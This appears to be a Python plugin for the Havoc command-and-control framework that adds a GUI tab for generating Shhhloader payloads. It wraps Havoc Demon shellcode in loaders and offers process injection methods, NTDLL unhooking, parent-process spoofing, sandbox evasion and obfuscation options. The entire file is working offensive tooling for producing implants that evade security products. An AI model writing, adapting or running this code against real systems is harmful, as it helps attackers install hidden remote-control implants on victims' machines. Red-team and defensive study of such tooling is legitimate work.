#!/usr/bin/env python
# -*- Coding: UTF-8 -*-
# Author: Jakob Friedl
# Created on: Mon, 16. Oct 2023
# Description: Shhhloader support for Havoc C2 framework
# Usage: Load this script into Havoc: Scripts -> Scripts Manager -> Load to create Shhhloader Tab

import os, sys, subprocess
import threading
import havoc
import havocui
from datetime import datetime
from base64 import b64decode, b64encode

# Configuration
shhhloader_path = "/opt/Shhhloader"
python_path = "/usr/bin/python3"
payload_file_path = "/tmp/payload.bin"
current_path = os.getcwd()

# Variables & Defaults
shellcode_path = ""
generate_from_listener = False
listener = ""
syscall_exec_method = "GetSyscallStub"
shellcode_exec_method = "QueueUserAPC"
process = "explorer.exe"
unhook_flag = ""
dll_flag = ""
proxy_dll = ""
verbose_flag = ""
word_encode_flag = ""
no_randomize_flag = ""
no_sandbox_flag = ""
llvm_flag = ""
ppid_flag = ""
ppid_priv_flag = ""
parent_process = "explorer.exe"
sandbox_evasion_method = "sleep"
sandbox_argument = ""
create_process_flag = ""
target_dll = "ntdll.dll"
export_function = "NtClose"

# Colors
havoc_error = "#ff5555" # Red
havoc_success = "#50fa7b" # Green
havoc_comment = "#6272a4" # Greyish blue
havoc_dark = "#555766" # Dark Grey
havoc_info = "#8be9fd" # Cyan
havoc_warning = "#ffb86c" # Orange

if not os.path.exists(shhhloader_path):
    print("[-] Shhhloader not found in: ", shhhloader_path) 
    havocui.messagebox("Shhhloader not found in: ", shhhloader_path)
os.chdir(current_path)

# Create dialog and log widget
dialog = havocui.Dialog("Shhhloader Payload Generator", True, 670, 800)
log = havocui.Logger("Shhhavoc Log")

# Add Options
def change_listener(num):
    global generate_from_listener
    global listener
    if num: 
        listener = listeners[num - 1]
        generate_from_listener = True
    else:
        generate_from_listener = False
    print("[*] Listener changed: ", listener)

label_to_replace = f"<b style=\"color:{havoc_error};\">No shellcode selected.</b>"
def change_shellcode_path(): 
    global shellcode_path
    global label_to_replace
    shellcode_path = havocui.openfiledialog("Shellcode path").decode("ascii")
    print("[*] Shellcode path changed: ", shellcode_path, ".")
    formatted_shellcode_path = f"<span style=\"color:{havoc_success};\">{shellcode_path}</span>"
    dialog.replaceLabel(label_to_replace, formatted_shellcode_path)
    label_to_replace = formatted_shellcode_path if shellcode_path != "" else f"<b style=\"color:{havoc_error};\">No shellcode selected.</b>" 

syscall_exec_methods = ["SysWhispers2", "SysWhispers3", "None"]
def change_syscall_exec_method(num):
    global syscall_exec_method
    if num: 
        syscall_exec_method = syscall_exec_methods[num - 1]
    else: 
        syscall_exec_method = "GetSyscallStub"
    print("[*] Syscall execution method changed: ", syscall_exec_method) 

shellcode_exec_methods = ["PoolParty", "PoolPartyModuleStomping", "ThreadlessInject", "ModuleStomping", "ProcessHollow", "EnumDisplayMonitors", "RemoteThreadContext", "RemoteThreadSuspended", "CurrentThread"]
def change_shellcode_exec_method(num):
    global shellcode_exec_method
    if num:
        shellcode_exec_method = shellcode_exec_methods[num - 1]
    else:
        shellcode_exec_method = "QueueUserAPC" 
    print("[*] Shellcode execution method changed: ", shellcode_exec_method)

payload_types = ["dll"]
def change_payload_type(num):
    global dll_flag
    if num: 
        dll_flag = "-d"
    else: 
        dll_flag = ""
    print("[*] DLL flag changed: ", bool(dll_flag)) 

def change_process(p): 
    global process 
    process = p
    print("[*] Process changed: ", process)

def change_verbose():
    global verbose_flag
    verbose_flag =  "-v" if not bool(verbose_flag) else "" 
    print("[*] Verbose flag changed: ", bool(verbose_flag))

def change_unhook():
    global unhook_flag
    unhook_flag =  "-u" if not bool(unhook_flag) else "" 
    print("[*] Unhook flag changed: ", bool(unhook_flag))

def change_no_randomize():
    global no_randomize_flag
    no_randomize_flag = "-nr" if not bool(no_randomize_flag) else ""
    print("[*] No-randomize flag changed: ", bool(no_randomize_flag))

def change_no_sandbox():
    global no_sandbox_flag
    no_sandbox_flag = "-ns" if not bool(no_sandbox_flag) else ""
    print("[*] No-sandbox flag changed: ", bool(no_sandbox_flag))

def change_llvm():
    global llvm_flag
    llvm_flag = "-l" if not bool(llvm_flag) else ""
    print("[*] LLVM flag changed: ", bool(llvm_flag))

def change_ppid_spoofing():
    global ppid_flag
    ppid_flag = "-np" if not bool(ppid_flag) else ""
    print("[*] No-PPID flag changed: ", bool(ppid_flag))

def change_ppid_priv():
    global ppid_priv_flag
    ppid_priv_flag = "-ppv" if not bool(ppid_priv_flag) else ""
    print("[*] PPID-Priv flag changed: ", bool(ppid_priv_flag))

encoding_methods = ["English Words"]
def change_encoding_method(num):
    global word_encode_flag
    if num: 
        word_encode_flag = "-w"
    else: 
        word_encode_flag = ""
    print("[*] Word-encoding flag changed: ", bool(word_encode_flag)) 

sandbox_evasion_methods = ["domain", "hostname", "username", "dll"]
def change_sandbox_evasion_method(num):
    global sandbox_evasion_method
    if num: 
        sandbox_evasion_method = sandbox_evasion_methods[num - 1]
    else: 
        sandbox_evasion_method = "sleep"
    print("[*] Sandbox evasion method changed: ", sandbox_evasion_method) 

def change_sandbox_argument(arg): 
    global sandbox_argument
    sandbox_argument = arg 
    print("[*] Sandbox argument changed: ", sandbox_argument)

def change_proxy_dll(arg): 
    global proxy_dll
    proxy_dll = arg 
    print("[*] Proxy DLL changed: ", proxy_dll)

def change_parent_process(p): 
    global parent_process
    parent_process = p
    print("[*] Parent process changed: ", parent_process)

def change_create_process():
    global create_process_flag
    create_process_flag = "-cp" if not bool(create_process_flag) else ""
    print("[*] Create-process flag changed: ", bool(create_process_flag))

def change_target_dll(arg): 
    global target_dll
    target_dll = arg 
    print("[*] Target DLL changed: ", target_dll)

def change_export_function(arg): 
    global export_function
    export_function = arg 
    print("[*] Export function changed: ", export_function)

# Execute Shhhloader and get output
def execute(file): 
    flags = f"{unhook_flag} {dll_flag} {verbose_flag} {llvm_flag} {no_randomize_flag} {no_sandbox_flag} {word_encode_flag} {ppid_flag} {ppid_priv_flag}"
    
    if sandbox_evasion_method != "sleep":
        flags = flags + f" -s {sandbox_evasion_method}"
    if sandbox_argument != "":
        flags = flags + f" -sa {sandbox_argument}"
    if proxy_dll != "":
        flags = flags + f" -dp {proxy_dll}"
    if parent_process != "":
        flags = flags + f" -pp {parent_process}"
    if process != "":
        flags = flags + f" -p {process}"

    # Threadless Inject options
    if shellcode_exec_method == "ThreadlessInject":
       flags = flags + f" {create_process_flag} -td {target_dll} -ef {export_function}" 

    log.addText(f"[<span style=\"color:{havoc_info};\">*</span>] Selecting output file path.")
    outfile = havocui.savefiledialog("Save").decode("ascii")
    if outfile == "":
        log.addText(f"[<span style=\"color:{havoc_warning};\">-</span>] No output file path specified. Defaulting to /tmp/a.exe.")
        outfile = "/tmp/a.exe"
    else:
        log.addText(f"[<span style=\"color:{havoc_success};\">+</span>] Output file path specified: {outfile}.")
    
    # change dir
    os.chdir(shhhloader_path)

    # Exec Shhhloader and get output
    cmd = f"{python_path} {shhhloader_path}/Shhhloader.py {file} -sc {syscall_exec_method} -m {shellcode_exec_method} -o {outfile} {flags}"
    try:
        output = subprocess.run([arg for arg in cmd.split(" ") if arg != ""], capture_output = True)
        decoded_stdout = output.stdout.decode("utf-8")
        decoded_stderr = output.stderr.decode("utf-8")
    except Exception as e:
        print(e)

    # reset dir
    os.chdir(current_path)

    # Create Log
    log.addText(f"[<span style=\"color:{havoc_info};\">*</span>] <span>{' '.join(output.args)}</span>")
    log.addText(f"{decoded_stdout}")
    if output.stderr != b"":
        log.addText(f"<b style=\"color:{havoc_error};\">Error:</b>")
        log.addText(f"<span style=\"color:{havoc_error};\">{decoded_stderr}</span>")
    else:
        log.addText(f"<b style=\"color:{havoc_success};\">Payload generated successfully at {outfile}!</b>")
    log.setBottomTab()

# Get demon shellcode and save it to file
def save_payload(data):
    log.addText(f"[<span style=\"color:{havoc_success};\">+</span>] Received B64 payload.")
    with open(payload_file_path, "wb") as file:
        file.write(b64decode(data))
    log.addText(f"[<span style=\"color:{havoc_success};\">+</span>] Wrote shellcode to file: {payload_file_path}.")
    execute(payload_file_path)

# Generate payload
def run():
    log.setBottomTab()
    log.addText(f"<b style=\"color:{havoc_dark};\">──────────────────────────────────────────────────────────────────────────────────────────────────────────</b>")
    log.addText(f"<b style=\"color:{havoc_comment};\">{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} </b>")
    
    # Generate shellcode from listener
    if generate_from_listener: 
        log.addText(f"[<span style=\"color:{havoc_info};\">*</span>] Generating payload for listener: <b style=\"color:{havoc_info};\">{listener}</b>")
        
        # Generate demon shellcode
        havoc.GeneratePayload(save_payload,
            "Demon",
            listener,
            "x64",
            "Windows Exe",
            "{ \
                \"Amsi/Etw Patch\": \"None\", \
                \"Indirect Syscall\": false,  \
                \"Injection\": { \
                    \"Alloc\": \"Native/Syscall\", \
                    \"Execute\": \"Native/Syscall\", \
                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\", \
                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\" \
                }, \
                \"Jitter\": \"15\", \
                \"Proxy Loading\": \"None (LdrLoadDll)\", \
                \"Sleep\": \"2\", \
                \"Sleep Technique\": \"Ekko\", \
                \"Stack Duplication\": false \
            }"
        )
    else: 
        if shellcode_path == "":
            havocui.messagebox("Error", "Please specify a valid shellcode path.")
            log.addText(f"[<span style=\"color:{havoc_error};\">-</span>] No shellcode file specified.")
            return
        execute(shellcode_path)

    dialog.close()

# Reset variable values
def set_default_values():
    global generate_from_listener, listener, syscall_exec_method, shellcode_exec_method, process, unhook_flag, dll_flag, proxy_dll, verbose_flag, word_encode_flag, no_randomize_flag, no_sandbox_flag, llvm_flag, ppid_flag, ppid_priv_flag, parent_process, sandbox_evasion_method, sandbox_argument, create_process_flag, target_dll, export_function

    generate_from_listener = False
    listener = ""
    syscall_exec_method = "GetSyscallStub"
    shellcode_exec_method = "QueueUserAPC"
    process = "explorer.exe"
    unhook_flag = ""
    dll_flag = ""
    proxy_dll = ""
    verbose_flag = ""
    word_encode_flag = ""
    no_randomize_flag = ""
    no_sandbox_flag = ""
    llvm_flag = ""
    ppid_flag = ""
    ppid_priv_flag = ""
    parent_process = "explorer.exe"
    sandbox_evasion_method = "sleep"
    sandbox_argument = ""
    create_process_flag = ""
    target_dll = "ntdll.dll"
    export_function = "NtClose"

def build(): 
    dialog.clear()
    set_default_values()

    # Get Listeners
    global listeners
    listeners = havoc.GetListeners()

    # Build Dialog
    dialog.addLabel(f"<b>────────────────────────────── Required Settings ──────────────────────────────</b>")
    dialog.addLabel("<b>[*] Shellcode (upload file or generate from Havoc listener)</b>")
    dialog.addCombobox(change_listener, "Upload from file", *listeners)
    dialog.addButton("Choose shellcode", change_shellcode_path)
    dialog.addLabel(label_to_replace)
    dialog.addLabel("<b>[*] Syscall execution method</b>")
    dialog.addCombobox(change_syscall_exec_method, "GetSyscallStub", *syscall_exec_methods)
    dialog.addLabel("<b>[*] Shellcode execution method</b>")
    dialog.addCombobox(change_shellcode_exec_method, "QueueUserAPC", *shellcode_exec_methods)
    dialog.addLabel("<b>[*] Payload type</b>")
    dialog.addCombobox(change_payload_type, "exe", *payload_types)
    dialog.addLabel("<b>[*] Injection Process (Default: explorer.exe)</b>")
    dialog.addLineedit("e.g. explorer.exe", change_process)
    dialog.addLabel("<b>────────────────────────────── Optional Settings ──────────────────────────────</b>")
    dialog.addCheckbox("Verbose (Default: False)", change_verbose)
    dialog.addCheckbox("Unhook NTDLL (Default: False)", change_unhook)
    dialog.addCheckbox("Disable syscall name randomization (Default: False)", change_no_randomize)
    dialog.addCheckbox("Disable sandbox checks (Default: False)", change_no_sandbox)
    dialog.addCheckbox("Use Obfuscator-LLVM (Default: False)", change_llvm)
    dialog.addCheckbox("Disable PPID spoofing (Default: False)", change_ppid_spoofing)
    dialog.addCheckbox("Enable spoofing for privileged parent process (Default: False)", change_ppid_priv)
    dialog.addLabel("")
    dialog.addLabel("<b>[#] Word-encoding method (Default: XOR)</b>")
    dialog.addCombobox(change_encoding_method, "XOR", *encoding_methods)
    dialog.addLabel("<b>[#] Sandbox evasion technique (Default: sleep)</b>")
    dialog.addCombobox(change_sandbox_evasion_method, "sleep", *sandbox_evasion_methods)
    dialog.addLabel("<b>[#] Sandbox evasion argument</b>")
    dialog.addLineedit("e.g. testlab.local", change_sandbox_argument)
    dialog.addLabel(f"<b>[#] Proxy DLL (must exist in {shhhloader_path})</b>")
    dialog.addLineedit("e.g. apphelp.dll", change_proxy_dll)
    dialog.addLabel(f"<b>[#] Parent process for PPID spoofing (Default: explorer.exe)</b>")
    dialog.addLineedit("e.g. explorer.exe", change_parent_process)
    dialog.addLabel("<b>────────────────────────────── ThreadlessInject ──────────────────────────────</b>")
    dialog.addCheckbox("Create process instead of injecting into one (Default: False)", change_create_process)
    dialog.addLabel(f"<b>[#] Target DDL containing export function (Default: ntdll.dll)</b>")
    dialog.addLineedit("e.g. ntdll.dll", change_target_dll)
    dialog.addLabel(f"<b>[#] Export function to overwrite (Default: NtClose)</b>")
    dialog.addLineedit("e.g. NtClose", change_export_function)
    dialog.addLabel("")
    dialog.addButton("Generate", run)
    dialog.exec() 

# Create Tab 
def shhhloader_generator():
    build()
havocui.createtab("Shhhavoc", "Shhhloader", shhhloader_generator)
